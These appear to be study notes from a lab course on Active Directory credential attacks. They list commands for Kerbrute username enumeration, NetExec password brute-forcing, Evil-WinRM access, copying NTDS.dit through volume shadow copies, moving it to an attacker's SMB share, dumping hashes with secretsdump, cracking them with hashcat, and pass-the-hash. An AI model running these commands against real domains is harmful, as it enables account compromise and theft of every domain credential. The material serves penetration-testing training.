`Active Directory` (`AD`) is a common and critical directory service in modern enterprise networks.

## Dictionary attacks against AD accounts using NetExec

Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username and/or password using a customized list of potential usernames and passwords.

 It can be rather `noisy` (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of [Group Policy](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791\(v=ws.11\)).

One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:

Often, an email address's structure will give us the employee's username (structure: `username@domain`). For example, from the email address `jdoe`@`inlanefreight.com`, we can infer that `jdoe` is the username.

#### Creating a custom list of usernames

We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using `Git`, we can run it against a list of real names as shown in the example output below:

	AstraX01@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt

#### Enumerating valid usernames with Kerbrute

Kerbrute can be used for brute-forcing, password spraying and username enumeration.

Before we start guessing passwords for usernames which might not even exist, it may be worthwhile identifying the correct naming convention and confirming the validity of some usernames.

 *Right now, we are only interested in username enumeration*

	AstraX01@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

{names.txt is the list of usernames} - now we have the right username 
#### **Launching a brute-force attack with NetExec**

we can launch a brute-force attack against the target domain controller using a tool such as NetExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller.

	AstraX01@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

{-u bwilliamson we find this username in kerbrute section above}

NetExec is using SMB to attempt to logon as user (`-u`) `bwilliamson` using a password (`-p`) list containing a list of commonly used passwords (`/usr/share/wordlists/fasttrack.txt`).

Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.

## Capturing NTDS.dit

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources.

Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.

#### Connecting to a DC with Evil-WinRM

We can connect to a target DC using the credentials we captured.

	AstraX01@htb[/htb]$ evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'

Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.

#### Checking local group membership

we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command

	*Evil-WinRM* PS C:\> net localgroup

We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights. We also will want to check what domain privileges we have.

#### Checking user account privileges including domain

	*Evil-WinRM* PS C:\> net user bwilliamson

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

#### Creating shadow copy of C:

We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the `C:` drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on `C:` as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup and disaster recovery software to perform operations.

	*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

#### Copying NTDS.dit from the VSS

We can then copy the `NTDS.dit` file from the volume shadow copy of `C:` onto another location on the drive to prepare to move NTDS.dit to our attack host.

	*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

**Note: As was the case with `SAM`, the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`. In order to successfully extract the hashes, one must download both files.**

#### Transferring NTDS.dit to attack host

Now `cmd.exe /c move` can be used to move the file from the target DC to the share on our attack host.

	*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData

#### Extracting hashes from NTDS.dit

With a copy of `NTDS.dit` on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket's `secretsdump`:

	AstraX01@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

---

#### A faster method: Using NetExec to capture NTDS.dit

Alternatively, we may benefit from using NetExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.

	AstraX01@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

## Cracking hashes and gaining credentials

We can proceed with creating a text file containing all the NT hashes, or we can individually copy and paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.

#### Cracking a single hash with Hashcat

	AstraX01@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

In many of the techniques we have covered so far, we have had success in cracking hashes we've obtained.

`What if we are unsuccessful in cracking a hash?`

## Pass the Hash (PtH) considerations

We can still use hashes to attempt to authenticate with a system using a type of attack called `Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work:

#### Pass the Hash (PtH) with Evil-WinRM Example

	AstraX01@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

